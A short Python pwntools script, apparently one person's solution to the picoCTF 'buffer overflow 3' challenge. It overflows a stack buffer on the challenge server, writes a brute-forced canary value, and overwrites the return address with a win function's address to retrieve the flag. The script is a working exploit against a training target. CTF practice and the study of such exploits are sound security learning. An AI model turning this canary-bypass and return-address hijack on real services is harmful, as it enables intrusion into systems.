# picoCTF-buffer-overflow-3-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 59402

    # variables
    offset_to_canary = 64
    offset_to_ret_addr = offset_to_canary + 20
    canary = "BiRd"                             # canary I found through brute force
    win_addr = 0x8049336
    payload = flat({
        offset_to_canary: canary,
        offset_to_ret_addr: p32(win_addr)
    })

    # connect to instance
    p = remote(host, port)

    # input size
    p.recvuntil(b"\n> ", timeout=1)
    p.sendline(f"{offset_to_ret_addr + 4}".encode())

    # deliver payload
    p.recvuntil(b"> ", timeout=1)
    p.send(payload)

    # retreive flag
    p.recvline(timeout=1)
    flag = p.recvline(timeout=1).decode().rstrip("\n")
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()